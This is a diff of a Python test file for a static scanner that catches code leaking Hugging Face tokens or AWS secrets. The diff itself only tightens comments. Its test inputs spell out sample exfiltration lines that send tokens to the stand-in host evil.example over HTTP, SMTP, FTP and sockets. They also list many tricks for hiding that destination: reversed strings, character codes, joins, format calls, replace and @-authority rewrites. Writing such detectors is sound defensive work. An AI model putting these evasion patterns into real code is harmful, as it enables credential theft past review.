         module._inline_constants(ast_module.parse(source))
@@ -4096,18 +3594,14 @@ def test_inlining_a_constant_is_charged_per_use():
         )
     ]
 
-    # Appending carries the same ceiling the join and the formatting do, since
-    # a chain of literal appends grows a prefix at every level whether a name
-    # was substituted into it or not: two operands over the limit are left
-    # unread rather than concatenated.
+    # Appending has the same ceiling as join and format, since a chain of literal appends grows at every level; over-limit operands stay unread.
     import ast as ast_module
     oversized = ast_module.parse(
         '"' + "A" * 600_000 + '" + "' + "B" * 600_000 + '"'
     ).body[0].value
     assert module._literal_text(oversized) is None
 
-    # A constant small enough to matter is still inlined, which is the whole
-    # point of doing it: this one assembles a destination.
+    # A constant small enough to matter is still inlined, since that is the point of folding: this one assembles a destination.
     assert [
         f.check for f in module.scan_converter_source(
             'import os\nimport requests\n'
@@ -4120,9 +3614,7 @@ def test_inlining_a_constant_is_charged_per_use():
 
 
 def test_a_destination_spelled_in_character_codes_refuses_it():
-    """bytearray([104, 116, 116, 112, 115]).decode() is a URL with no URL in it,
-    and so is "".join(chr(c) for c in codes).
-    """
+    """A destination built from character codes, such as bytearray(...).decode() or a chr join, is a URL with no URL spelled in the source, so refuse it."""
     scan_converter_source = _load(
         "converter_scan_codes_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4148,10 +3640,7 @@ def test_a_destination_spelled_in_character_codes_refuses_it():
 
 
 def test_a_sliced_constant_and_an_oversized_template_are_read_or_refused():
-    """"c/tcelloc/elpmaxe.live//:sptth"[::-1] is a whole URL written backwards, so
-    nothing matched a scheme and the hub literal beside it granted the
-    allowance.
-    """
+    """Sliced constants must be read or refused: a URL written backwards and sliced with [::-1] matched no scheme and the hub literal granted the allowance."""
     module = _load(
         "converter_scan_slice_probe", "unsloth_zoo/converter_scan.py",
     )
@@ -4165,9 +3654,7 @@ def test_a_sliced_constant_and_an_oversized_template_are_read_or_refused():
             + 'requests.get("c/tcelloc/elpmaxe.live//:sptth"[::-1], ' + token
         )
     ]
-    # A bound this cannot read, over text that spells no URL until it is
-    # sliced: the fold cannot help here, and not reading it is not a reason to
-    # say nothing.
+    # A bound this cannot read, over text that spells no URL until sliced: the fold cannot help, and unread text must not yield silence.
     assert [
         f.check for f in scan_converter_source(
             preamble
@@ -4175,8 +3662,7 @@ def test_a_sliced_constant_and_an_oversized_template_are_read_or_refused():
         )
     ]
 
-    # Slicing what came back from the hub is what upstream does, and it is not
-    # a literal at all.
+    # Slicing what came back from the hub is what upstream does, and it is not a literal at all.
     assert scan_converter_source(
         preamble + 'url = f"{HUB}/api"\nraw = data[:8]\n'
         + 'requests.get(url, ' + token
@@ -4188,8 +3674,7 @@ def test_a_sliced_constant_and_an_oversized_template_are_read_or_refused():
             + 'requests.get(HUB, ' + token
         )
     ]
-    # A template of an ordinary size is still folded, which is what keeps the
-    # fifteen upstream .format() calls readable.
+    # A template of ordinary size is still folded, which keeps the fifteen upstream .format() calls readable.
     assert scan_converter_source(
         preamble + 'url = "{}/api/models".format(HUB)\n'
         + 'requests.get(url, ' + token
@@ -4197,10 +3682,7 @@ def test_a_sliced_constant_and_an_oversized_template_are_read_or_refused():
 
 
 def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
-    """`j = urljoin` rebinds the builder with no import in sight, so following
-    import aliases was not enough: a single assignment of one name to another
-    is followed the same way.
-    """
+    """Following import aliases is not enough: a plain assignment such as j = urljoin rebinds the builder and must be followed the same way."""
     module = _load(
         "converter_scan_rebind_probe", "unsloth_zoo/converter_scan.py",
     )
@@ -4215,9 +3697,7 @@ def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
         )
     ]
 
-    # The budget is on the folding, so it is asserted on the folding rather
-    # than on a clock: every fold is charged as it is produced, and a decision
-    # that runs out raises rather than carrying on.
+    # The budget is charged per fold and asserted on folding, not on a clock: a decision that runs out raises rather than carrying on.
     import ast as ast_module
     module._fold_state.budget = 1_000
     try:
@@ -4231,8 +3711,7 @@ def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
     finally:
         del module._fold_state.budget
 
-    # And a file of joins that are each inside their own ceiling, 6.4 MB of
-    # them, is refused rather than folded through sixteen carrier passes.
+    # A file of joins that are each inside their own ceiling is refused rather than folded through sixteen carrier passes.
     one = '"' + "A" * 3_500 + '".join([' + ",".join(['""'] * 290) + '])\n'
     assert [
         f.check for f in scan_converter_source(
@@ -4245,9 +3724,7 @@ def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
 
 
 def test_a_join_over_pieces_this_cannot_enumerate_refuses_it():
-    """"".join(x for x in ("https", "://evil.example/c")) is a whole URL, and the
-    walk sees two pieces neither of which carries a scheme.
-    """
+    """A join over pieces the walk cannot enumerate is a whole URL in parts, so it must be refused; neither piece carries a scheme on its own."""
     scan_converter_source = _load(
         "converter_scan_join_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4262,9 +3739,7 @@ def test_a_join_over_pieces_this_cannot_enumerate_refuses_it():
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
-    # A separator this cannot read is not a hole either: it folded to one in
-    # the middle of a scheme, and str().join(("htt", "ps://evil.example/c"))
-    # read as htt<hole>ps://... with no destination anywhere.
+    # An unreadable separator is not a hole either: str().join(("htt", "ps://evil.example/c")) folded mid-scheme with no destination named.
     for body in (
         'url = str().join(("htt", "ps://evil.example/c"))\n' + send,
         'url = sep.join(("htt", "ps://evil.example/c"))\n' + send,
@@ -4283,10 +3758,7 @@ def test_a_join_over_pieces_this_cannot_enumerate_refuses_it():
 
 
 def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
-    """"https" * 1 + "://evil.example/c" carries its scheme in a repetition, which
-    was neither folded nor refused, so no literal in the file held a URL at
-    all.
-    """
+    """A URL built by repetition, such as a scheme string times 1 plus a host, must be folded or refused rather than left unread."""
     module = _load(
         "converter_scan_repeat_probe", "unsloth_zoo/converter_scan.py",
     )
@@ -4300,9 +3772,7 @@ def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
-    # A reducer applies the same plus pairwise, which no fold can follow:
-    # functools.reduce(operator.add, ["https", "://evil.example/c"]) builds a
-    # URL out of pieces this reads one at a time.
+    # A reducer applies plus pairwise, which no fold can follow: functools.reduce(operator.add, ["https", "://evil.example/c"]) builds a URL.
     for body in (
         'import functools, operator\n'
         'url = functools.reduce(operator.add, ["https", "://evil.example/c"])\n'
@@ -4312,9 +3782,7 @@ def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
-    # A count this cannot read leaves the text AND a hole, not only a hole:
-    # returning the hole alone made the multiplication look fully read, so the
-    # walk skipped its children and a URL written out in full named nothing.
+    # An unreadable count keeps the text and a hole; returning only the hole skipped its children, so a URL written out in full named nothing.
     assert [
         f.check for f in scan_converter_source(
             preamble + 'url = "https://evil.example/c" * n\n' + send
@@ -4334,11 +3802,7 @@ def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
 
 
 def test_a_string_method_called_unbound_is_still_that_method():
-    """Called unbound, the receiver is the type rather than the template, so every
-    rule that reads a receiver saw str and the template went past as an
-    ordinary argument: str.format("{}://{}", "https", "evil.example/c") named
-    no destination at all, and str.replace and str.join did the same.
-    """
+    """Called unbound, str.format and similar take the template as an ordinary argument, so receiver-based rules must still read it as the template."""
     scan_converter_source = _load(
         "converter_scan_unbound_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4358,11 +3822,7 @@ def test_a_string_method_called_unbound_is_still_that_method():
 
 
 def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
-    """The honest hub download can stay in the file. smtplib.SMTP(
-    "evil.example").sendmail(..., os.environ["HF_TOKEN"]) makes both original
-    predicates true, and no walk over the literals can say where it sends,
-    because its destination is a bare host rather than a URL.
-    """
+    """The hub download may stay, but smtplib.SMTP sending HF_TOKEN to a bare host must refuse the allowance, since no literal says where it sends."""
     scan_converter_source = _load(
         "converter_scan_client_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4376,17 +3836,13 @@ def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
         'ftplib.FTP("evil.example").storbinary("STOR x",'
         ' os.environ["HF_TOKEN"].encode())\n',
         'from websockets import connect as c\nc("wss://evil.example")\n',
-        # The member counts with its parent: from http import client is
-        # http.client, and reading the module alone saw only "http".
+        # A from-import member counts with its parent: from http import client is http.client, not just the module http.
         'from http import client\n'
         'c = client.HTTPSConnection("evil.example")\n'
         'c.putrequest("GET", "/")\n'
         'c.putheader("a", os.environ["HF_TOKEN"])\nc.endheaders()\n',
         'from urllib import request\nrequest.urlopen("http://evil.example")\n',
-        # asyncio is imported for all sorts of reasons, so the refusal is on
-        # the connection API rather than on the module: open_connection(
-        # "evil.example", 443) names a host and writelines is not a write this
-        # rule knows.
+        # asyncio is imported for many reasons, so the refusal targets the connection API: open_connection names a host; writelines is not a known write.
         'import asyncio\n'
         'reader, writer = asyncio.open_connection("evil.example", 443)\n'
         'writer.writelines([os.environ["HF_TOKEN"].encode()])\n',
@@ -4396,8 +3852,7 @@ def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
             f.check for f in scan_converter_source(preamble + body + download)
         ], body
 
-    # An ordinary member of an ordinary module is not one of these, and
-    # neither is asyncio itself.
+    # An ordinary member of an ordinary module is not one of these, and neither is asyncio itself.
     assert scan_converter_source(
         preamble + 'from os import path\n' + download
     ) == []
@@ -4429,8 +3884,7 @@ def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
             f.check for f in scan_converter_source(preamble + body + download)
         ], body
 
-    # And the call itself can be renamed: from importlib import import_module
-    # as im, im = importlib.import_module, imp = __import__.
+    # The import call itself can be renamed, via from-import as im, or by binding importlib.import_module or __import__ to a name.
     for body in (
         'from importlib import import_module as im\n'
         'im("smtplib").SMTP("evil.example")\n',
@@ -4442,8 +3896,7 @@ def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
             f.check for f in scan_converter_source(preamble + body + download)
         ], body
 
-    # And a computed lookup leaves the importer as a string and nothing else,
-    # exactly as the write methods and the environment names did.
+    # A computed lookup leaves the importer as a string and nothing else, as the write methods and environment names did.
     for body in (
         'import builtins\n'
         'builtins.__dict__["__import__"]("smtplib").SMTP("evil.example")\n',
@@ -4500,10 +3953,7 @@ def test_the_allowance_runs_where_the_match_statement_does_not_exist():
 
 
 def test_a_descriptor_bound_to_a_name_is_still_that_method():
-    """r = str.replace then r(HUB, "huggingface.co", "evil.example") is the same
-    rewrite with the method behind a name, which no rule that reads a call site
-    could see.
-    """
+    """Binding str.replace to a name and calling it rewrites a hub URL just as the direct call does, so call-site rules alone cannot catch it."""
     scan_converter_source = _load(
         "converter_scan_descriptor_alias_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4521,17 +3971,13 @@ def test_a_descriptor_bound_to_a_name_is_still_that_method():
 
 
 def test_a_bytes_environment_read_and_a_called_plus_are_read():
-    """os.getenvb(b"AWS_SECRET_ACCESS_KEY") is the same read as os.getenv on Unix,
-    and exempting it left the collected set holding the hub token alone while a
-    hub GET carried both values.
-    """
+    """os.getenvb reads the environment like os.getenv on Unix, so it must be collected; exempting it let a hub GET carry a secret the set never recorded."""
     module = _load(
         "converter_scan_getenvb_probe", "unsloth_zoo/converter_scan.py",
     )
     scan_converter_source = module.scan_converter_source
 
-    # Attributed by name, not merely refused as a read this cannot place: a
-    # bytes key is a key, and the allowance turns on which names are read.
+    # Attributed by name, not merely refused: a bytes key is still a key, and the allowance turns on which names are read.
     import ast as ast_module
     assert module._env_reads(
         ast_module.parse('import os\nx = os.getenvb(b"AWS_SECRET_ACCESS_KEY")\n')
@@ -4549,9 +3995,7 @@ def test_a_bytes_environment_read_and_a_called_plus_are_read():
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
-    # The other two operators that build a string are the same call in
-    # disguise, and folding them means standing the operator back up rather
-    # than repeating its rules: mod, mul, their in-place names and the dunders.
+    # Other string-building operators (mod, mul, their in-place names and dunders) are folded by calling the operator, not re-implementing its rules.
     for body in (
         'import operator\n'
         'url = operator.mod("%s://%s/c", ("https", "evil.example"))\n' + send,
@@ -4567,8 +4011,7 @@ def test_a_bytes_environment_read_and_a_called_plus_are_read():
         preamble + 'import operator\nurl = operator.mod("%s/api", HUB)\n' + send
     ) == []
 
-    # And the same function under its own name: from operator import add,
-    # aliased, or rebound. set.add is not one of these, since these take two.
+    # The same function is caught under its own name, aliased, or rebound; set.add is not one of these, since these take two arguments.
     for body in (
         'from operator import add\nurl = add("https", "://evil.example/c")\n'
         + send,
@@ -4590,9 +4033,7 @@ def test_a_bytes_environment_read_and_a_called_plus_are_read():
 
 
 def test_two_scans_at_once_do_not_share_one_budget():
-    """The fold budget was a module global, so two exports running at once charged
-    the same counter and the first to finish cleared it under the second.
-    """
+    """The fold budget must be per scan, not a module global, since concurrent exports shared one counter and the first to finish cleared it for the other."""
     import threading
 
     module = _load(
@@ -4604,8 +4045,7 @@ def test_two_scans_at_once_do_not_share_one_budget():
         'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
     )
     module._fold_state.budget = 4_096
-    # The charge is read from this thread's state, which is what makes the
-    # budget a property of one decision rather than of the process.
+    # The charge is read from this thread's state, so the budget is a property of one decision, not of the process.
     try:
         module._charge_fold("x" * 4_097)
     except module._FoldBudgetExceeded:
@@ -4626,10 +4066,7 @@ def test_two_scans_at_once_do_not_share_one_budget():
 
 
 def test_a_decoded_literal_and_a_scheme_built_a_character_at_a_time():
-    """Bytes holding UTF-16 for an attacker URL are read here as UTF-8 replacement
-    text, so nothing in the file spelled a host, and decoding a literal is now
-    refused outright.
-    """
+    """Decoding a literal is refused outright, since UTF-16 bytes read as UTF-8 replacement text hid the host from every literal check."""
     scan_converter_source = _load(
         "converter_scan_decode_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4659,8 +4096,7 @@ def test_a_decoded_literal_and_a_scheme_built_a_character_at_a_time():
         + 'lines = requests.get(url).text.split("\\n")\n' + send
     ) == []
 
-    # Decoding the download is what upstream does, and the hub URL beside it
-    # is still read as the hub.
+    # Decoding the download is what upstream does, and the hub URL beside it is still read as the hub.
     assert scan_converter_source(
         preamble + 'url = f"{HUB}/api"\n'
         + 'raw = requests.get(url).content.decode()\n' + send
@@ -4668,10 +4104,7 @@ def test_a_decoded_literal_and_a_scheme_built_a_character_at_a_time():
 
 
 def test_a_literal_transformed_by_any_unreadable_method_refuses_it():
-    """Named methods were losing one at a time: replace with dynamic arguments,
-    decode of UTF-16 bytes, split indexed back together, and then
-    "https".ljust(6, ":") turning a word into a scheme.
-    """
+    """String methods that rebuild a URL must be tracked: replace with dynamic args, UTF-16 decode, split-and-rejoin, and ljust can turn a word into a scheme."""
     scan_converter_source = _load(
         "converter_scan_any_method_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4703,9 +4136,7 @@ def test_a_literal_transformed_by_any_unreadable_method_refuses_it():
 
 
 def test_a_token_sent_over_plaintext_refuses_the_hub_allowance():
-    """The host is the hub and the scheme is http, so the credential goes out
-    where anyone on the path can read it.
-    """
+    """A token sent over plaintext http to the hub refuses the allowance, since anyone on the path could read the credential."""
     scan_converter_source = _load(
         "converter_scan_plaintext_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4741,10 +4172,7 @@ def test_the_hub_narrowing_does_not_reach_any_other_rule():
 
 
 def test_the_hub_allowance_reads_the_real_hostname():
-    """Reads throughout, deliberately: the allowance refuses a write to the hub
-    outright, so a POST here would make every case pass without the hostname
-    check doing anything.
-    """
+    """Every case here is a read, deliberately: the allowance refuses hub writes outright, so a POST would pass without the hostname check running."""
     scan_converter_source = _load(
         "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4766,9 +4194,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
     assert _findings("https://huggingface.co.evil.example/collect")
     # A URL with no host at all names no destination, so nothing is suppressed.
     assert _findings("https:///collect")
-    # And it still counts when it sits beside a real hub URL, which is the shape
-    # that matters: dropping hostless URLs instead of recording them let one be
-    # hidden behind a hub link in the same file.
+    # A hostless URL still counts beside a real hub URL: dropping hostless URLs instead of recording them let one hide behind a hub link.
     assert [
         f.check for f in scan_converter_source(
             'import os\n'
@@ -4779,9 +4205,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
         )
     ]
 
-    # A scheme requests accepts is a scheme this has to read. requests
-    # normalizes HTTPS://, so a lowercase-only pattern let the destination be
-    # spelled past the check.
+    # Any scheme requests accepts must be read: requests normalizes HTTPS://, so a lowercase-only pattern let the destination slip past.
     def _beside_the_hub(destination):
         return [
             f.check for f in scan_converter_source(
@@ -4803,8 +4227,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
     assert _findings("https://huggingface.co:443/api/models") == []
     assert _findings("https://HuggingFace.CO/api/models") == []
 
-    # bytes are URLs too: requests decodes b"https://..." and accepts it, so a
-    # destination in a bytes literal was invisible beside a str hub literal.
+    # Bytes are URLs too: requests decodes b"https://..." and accepts it, so a destination in a bytes literal must be read beside a str hub literal.
     assert _beside_the_hub('b"https://evil.example/collect"')
 
     # A backslash is part of the URL, not a place to stop reading it.
@@ -4813,10 +4236,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
             '"https://huggingface.co' + separator + '@evil.example/collect"'
         ), f"a {separator!r} in the authority must refuse the allowance"
 
-    # A destination spelled across `+` or `%` is still spelled out in full, and
-    # ast.parse does not fold either, so each operand named no host and a hub
-    # literal elsewhere in the file granted the allowance over a URL that reads
-    # as evil.example to every client.
+    # A destination spelled across + or % still reads as evil.example; ast.parse does not fold either, so a hub literal elsewhere must not grant it.
     assert _beside_the_hub('"https://" + "evil.example/collect"')
     assert _beside_the_hub('"htt" + "ps://evil.example/collect"')
     assert _beside_the_hub('"https://" + "evil.example" + "/collect"')
@@ -4832,33 +4252,22 @@ def test_the_hub_allowance_reads_the_real_hostname():
     # Only %s, %r and %% are folded:
     assert _beside_the_hub('"%2000000000d" % 1') == []
 
-    # An f-string arrives here already split, and an empty interpolation is a
-    # no-op at runtime: f"https://{''}evil.example/log" fetches evil.example
-    # while leaving the scheme in one constant piece and the whole hostname, in
-    # plain sight, in another that no longer has a scheme in front of it.
+    # An f-string arrives already split, and an empty interpolation is a runtime no-op, so f"https://{''}evil.example" must still be read as a destination.
     assert _beside_the_hub("f\"https://{''}evil.example/collect\"")
     assert _beside_the_hub('f"https://{SEP}evil.example/collect"')
     assert _beside_the_hub('f"https://{org}.huggingface.co/api/models"')
 
-    # These two discriminate the f-string fold from every other check here: the
-    # constant piece in front IS the hub, so a walk that reads the pieces
-    # separately records huggingface.co and allows the file, while at runtime
-    # f"https://huggingface.co{SUFFIX}" with SUFFIX = "@evil.example/collect"
-    # fetches evil.example, everything before the @ being user information.
+    # These discriminate the f-string fold: a hub constant in front plus SUFFIX = "@evil.example/collect" really fetches evil.example.
     assert _beside_the_hub('f"https://huggingface.co{SUFFIX}"')
     assert _beside_the_hub("f\"https://huggingface.co{'@evil.example/collect'}\"")
     assert _beside_the_hub('f"https://huggingface.co{tld}/api/models"')
 
-    # A scheme with no authority at all means the destination is assembled
-    # somewhere this cannot follow, which every splitting trick was built on.
+    # A scheme with no authority means the destination is assembled somewhere this cannot follow; every splitting trick relies on that.
     assert _beside_the_hub('"".join(("https://", "evil.example")) + "/collect"')
     assert _beside_the_hub('"{}evil.example/collect".format("https://")')
     assert _beside_the_hub('"https://"')
 
-    # A literal reaches the request as written only if nothing reshapes it, and
-    # BASE.replace("huggingface.co", "evil.example") fetches evil.example while
-    # every literal in the file is either the hub or a bare name with no scheme
-    # in front of it.
+    # A literal reaches the request as written only if nothing reshapes it; BASE.replace("huggingface.co", "evil.example") still fetches evil.example.
     def _reshaped(body):
         return [
             f.check for f in scan_converter_source(
@@ -4873,20 +4282,16 @@ def test_the_hub_allowance_reads_the_real_hostname():
     assert _reshaped('url = BASE.replace("huggingface.co", "evil.example")\n')
     assert _reshaped('url = "https://huggingface.co"[:8] + "evil.example"\n')
     assert _reshaped('url = BASE[:8] + "evil.example"\n')
-    # Through an intermediate string, and through a walrus, which is the same
-    # receiver wearing a different hat.
+    # Reshaping through an intermediate string or a walrus binding is still caught: it is the same receiver under another name.
     assert _reshaped(
         'u = f"{BASE}"\nurl = u.replace("huggingface.co", "evil.example")\n'
     )
     assert _reshaped(
         'url = (u := BASE).replace("huggingface.co", "evil.example")\n'
     )
-    # str.join was the last construction the folding did not model, and it beat
-    # both of the checks above:
+    # str.join was the last construction the folding did not model; it got past both of the checks above.
     assert _beside_the_hub('"".join(("htt", "ps://ev", "il.exa", "mple/collect"))')
-    # str.format splits a scheme the same way, and upstream spells plenty of
-    # strings with it, 15 literal receivers across the real modules, so this
-    # one is FOLDED rather than refused.
+    # str.format splits a scheme the same way; upstream uses it on 15 literal receivers in the real modules, so this one is FOLDED, not refused.
     assert _beside_the_hub('"{}://{}".format("https", "evil.example/collect")')
     assert _beside_the_hub('"{s}://{h}/c".format(s = "https", h = "evil.example")')
     assert _beside_the_hub(
@@ -4897,15 +4302,11 @@ def test_the_hub_allowance_reads_the_real_hostname():
     # The hole has to stay in the text.
     assert _beside_the_hub('"".join(["https://huggingface.co", SUFFIX])')
     assert _beside_the_hub('"/".join(["https:/", "evil.example", "collect"])')
-    # And the same seam in the other direction: a carrier put through a join
-    # came out the far side untainted, so reshaping the result was not a
-    # reshape of anything.
+    # A carrier put through a join comes out untainted on the far side, so reshaping the joined result was not seen as a reshape.
     assert _reshaped('url = "".join([BASE, "/x"]).replace("huggingface.co", "evil.example")\n')
-    # += mutates the carrier in place and the walk still sees only the hub it
-    # started as, while at runtime the authority resolves to evil.example.
+    # += mutates the carrier in place; the walk still sees only the hub it started as, while at runtime the authority resolves to evil.example.
     assert _reshaped('url = BASE\nurl += "@evil.example/collect"\n')
-    # Appending to a carrier can rewrite the authority without touching the
-    # literal:
+    # Appending to a carrier can rewrite the authority without touching the literal.
     assert _reshaped('url = urljoin(BASE, "//evil.example/collect")\n')
     assert _reshaped(
         'import urllib.parse\nurl = urllib.parse.urljoin(BASE, "//evil.example/c")\n'
@@ -4921,8 +4322,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
     assert _reshaped('url = BASE + "/api/models"\n') == []
     assert _reshaped('url = BASE + "?full=true"\n') == []
     assert _reshaped('url = f"{BASE}/api/{name}"\n') == []
-    # A carrier can be bound by unpacking or onto an attribute, and reading only
-    # bare Name targets lost it.
+    # A carrier can be bound by unpacking or onto an attribute; reading only bare Name targets lost it.
     assert _reshaped(
         'B, = ("https://huggingface.co",)\n'
         'url = B.replace("huggingface.co", "evil.example")\n'
@@ -4935,9 +4335,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
         'C.B = "https://huggingface.co"\n'
         'url = C.B.replace("huggingface.co", "evil.example")\n'
     )
-    # A dictionary is a container like the others, and a lookup by name reads
-    # the value out rather than taking the string apart, so the carrier passes
-    # through it while a benign dictionary of hub URLs stays readable.
+    # A dict lookup reads the value out rather than taking the string apart, so a carrier passes through; a benign dict of hub URLs stays readable.
     assert _reshaped(
         'URLS = {"hub": "https://huggingface.co"}\n'
         'url = URLS["hub"].replace("huggingface.co", "evil.example")\n'
@@ -4961,21 +4359,14 @@ def test_the_hub_allowance_reads_the_real_hostname():
     chain = "".join(
         f'v{i} = f"{{v{i - 1}}}/x"\n' for i in range(1500)
     ).replace("{v-1}", "{BASE}")
-    # The verdict carries this one: a fixpoint that does not settle inside its
-    # passes refuses, so an unbounded walk shows up as a different answer and
-    # not merely as a slow one.
+    # The verdict carries this one: a fixpoint that does not settle within its passes refuses, so an unbounded walk changes the answer, not just the speed.
     assert _reshaped(chain + 'url = v1499.replace("huggingface.co", "evil.example")\n')
 
-    # The chain itself is what forces the passes, so the assignments are
-    # collected once rather than walked again per pass: 10000 of them, 203 KB,
-    # took about two seconds that way on a file the scan accepts at up to 8 MiB.
+    # The chain forces the passes, so assignments are collected once rather than walked per pass; the scan accepts files up to 8 MiB.
     long_chain = 'v0 = BASE\n' + "".join(
         f'v{i} = v{i - 1} + "/x"\n' for i in range(1, 10_000)
     )
-    # Generous on purpose: this is the one check here with nothing but time to
-    # measure, and it exists to catch a return to walking the tree per pass,
-    # which took about a minute on this input rather than the two seconds it
-    # takes now.
+    # Generous on purpose: this is the one timing-only check, guarding against a return to walking the tree once per pass.
     started = time.perf_counter()
     _reshaped(long_chain)
     assert time.perf_counter() - started < 60
@@ -4991,8 +4382,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
         'head = r.content[:8]\n'
     ) == []
 
-    # The hub through an f-string is still the hub, including upstream's own
-    # f"{BASE_DOMAIN}/{path}" and a BASE_DOMAIN with no trailing path.
+    # An f-string of the hub is still the hub, including upstream f"{BASE_DOMAIN}/{path}" and a BASE_DOMAIN with no trailing path.
     assert _beside_the_hub('f"https://huggingface.co/api/models/{name}"') == []
     assert _beside_the_hub('f"{HUB}/api/models"') == []
     assert _beside_the_hub('"https://huggingface.co"') == []
